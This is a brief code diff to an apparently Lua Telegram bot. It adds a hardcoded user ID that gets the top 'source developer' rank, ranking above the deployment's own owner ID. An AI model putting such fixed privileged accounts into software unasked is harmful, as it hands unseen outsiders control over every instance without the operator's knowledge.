@@ -251,6 +251,9 @@ msg.Rank = 1
 elseif msg.sender_user_id_ == 905128847 then 
 msg.TheRank =  'مطور السورس'
 msg.Rank = 1
+elseif msg.sender_user_id_ == 1753323063 then 
+msg.TheRank =  'مطور السورس'
+msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = 'المطور ' 
 msg.TheRank = 'مطور اساسي ' 
